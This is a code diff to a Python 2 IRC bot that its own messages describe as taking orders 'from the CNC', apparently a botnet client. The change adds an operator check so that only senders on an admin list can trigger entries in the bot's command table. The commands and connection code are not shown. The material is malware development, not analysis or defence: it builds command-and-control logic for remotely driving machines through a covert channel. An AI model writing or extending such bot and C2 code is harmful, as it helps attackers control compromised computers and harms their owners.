@@ -64,18 +64,22 @@ commands = {
 
 #function which parses the command and determine how to handle it
 def parseCommand(command):
-	print "given '%s'" % command
 	arg = "PRIVMSG"
 	if (arg in command):
-		tempCommand = command[command.index(arg):]
-		command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
-		
-		print "Recieved %s from the CNC" % command
-		if command in commands.keys():
-			commands[command]()
-			print "function called"
+		user = command[1:command.index("!~")]
+		# print "user is '%s'" % user
+		if user in admins:
+			tempCommand = command[command.index(arg):]
+			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
+			
+			print "Recieved %s from the CNC" % command
+			if command in commands.keys():
+				commands[command]()
+				print "function called"
+			else:
+				print "command '%s' not defined" % command
 		else:
-			print "command '%s' not defined" % command
+			print "user '%s' not in list of admins" % user
 
 
 #Connecting to the IRC Server
